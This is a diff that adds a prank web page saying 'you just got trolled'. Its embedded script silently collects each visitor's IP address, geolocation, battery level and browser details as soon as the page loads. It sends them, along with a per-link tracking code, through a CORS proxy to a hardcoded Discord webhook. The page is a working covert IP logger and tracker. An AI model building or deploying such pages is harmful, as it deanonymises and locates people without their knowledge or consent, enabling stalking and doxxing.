@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="robots" content="noindex, nofollow">
+    <title>YOU'RE SO SILLY!!</title>
+    <style>
+        @font-face {
+            font-family: VCR;
+            src: url(https://linux.scot/fonts/VCR.ttf);
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        h1 {
+            font-size: 3rem;
+            color: #333;
+            text-transform: uppercase;
+            position: relative;
+            transition: transform 0.3s;
+        }
+        h1:hover {
+            transform: scale(1.1);
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align: center; font-family: 'VCR', sans-serif;">you just got trolled</h1>
+
+    <script>
+        // Funktion zum Auslesen der URL-Parameter
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            const results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Hauptfunktion mit async/await
+        async function sendWebhookData() {
+            try {
+                // 1. IP-Adresse abrufen
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+
+                // 2. Geolocation-Daten abrufen
+                const geoResponse = await fetch(`https://freeipapi.com/api/json/${ipAddress}`);
+                const geoData = await geoResponse.json();
+                const geoLocationData = JSON.stringify(geoData, null, 2);
+
+                // 3. Batteriestatus abrufen (Gefixt: Wartet nun auf das Promise)
+                let batteryLevel = 'N/A';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = (battery.level * 100).toFixed(2) + '%';
+                }
+
+                // 4. Discord Embed zusammenbauen
+                const embed = {
+                    title: 'Success!',
+                    description: `Tracking Code: ${getParameterByName('code') || 'Keiner'}`,
+                    fields: [
+                        { name: 'IP Address', value: ipAddress },
+                        { name: 'Geolocation', value: `\`\`\`json\n${geoLocationData}\n\`\`\`` },
+                        { name: 'Battery Level', value: batteryLevel },
+                        { name: 'Device', value: navigator.userAgent },
+                        { name: 'More Info', value: `https://whatismyipaddress.com/ip/${ipAddress}` }
+                    ],
+                    footer: { text: 'powered by linux.scot' }
+                };
+
+                // 5. Webhook URL via CORS-Proxy senden
+                const rawWebhookUrl = 'https://discord.com/api/webhooks/1539315794360406027/EI2KqoptoK_ewECahX2OfOQ2P1cs1vRRIQYRY3yrtS64lqf0SKPowMaas8zBWdKdsT0V';
+                // Der Proxy umgeht die Cross-Origin Blockade von Discord
+                const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(rawWebhookUrl);
+
+                const discordResponse = await fetch(proxyUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+
+                if (discordResponse.ok) {
+                    console.log('Embed erfolgreich gesendet!');
+                } else {
+                    console.error('Fehler beim Senden des Embeds an Discord.');
+                }
+
+            } catch (error) {
+                console.error('Ein Fehler ist im Skript aufgetreten:', error);
+            }
+        }
+
+        // Skript ausführen
+        sendWebhookData();
+    </script>
+</body>
+</html>
